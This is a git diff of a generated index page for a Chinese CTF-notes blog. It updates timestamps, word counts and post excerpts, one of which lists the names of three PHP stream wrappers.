+                <time title="修改时间：2023-02-12 14:41:18" itemprop="dateModified" datetime="2023-02-12T14:41:18+08:00">2023-02-12</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -830,7 +579,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>450</span>
+              <span>452</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -849,7 +598,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p> 持续更新中</p>
+          <p>  buu第一页。</p>
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2023/01/24/buu-misc/#more" rel="contents">
@@ -1193,7 +942,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-01-24 18:53:44" itemprop="dateModified" datetime="2023-01-24T18:53:44+08:00">2023-01-24</time>
+                <time title="修改时间：2023-02-12 14:39:50" itemprop="dateModified" datetime="2023-02-12T14:39:50+08:00">2023-02-12</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -1230,7 +979,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>持续更新中。。</p>
+          <p> layout 布置<br></p>
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2023/01/11/%E5%8D%9A%E5%AE%A2%E5%88%9B%E5%BB%BA/#more" rel="contents">
@@ -1288,7 +1037,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-01-27 22:09:51" itemprop="dateModified" datetime="2023-01-27T22:09:51+08:00">2023-01-27</time>
+                <time title="修改时间：2023-02-12 14:37:11" itemprop="dateModified" datetime="2023-02-12T14:37:11+08:00">2023-02-12</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -1306,7 +1055,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>366</span>
+              <span>369</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -1325,7 +1074,9 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p> 持续更新中。。。</p>
+          <p><code>php://input</code></p>
+<p><code>data://text/plain</code>,xxxx</p>
+<p><code>php://filter</code></p>
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2023/01/09/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/#more" rel="contents">
@@ -1473,7 +1224,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">47 分钟</span>
+    <span title="站点阅读时长">48 分钟</span>
 </div>
 
 <!--
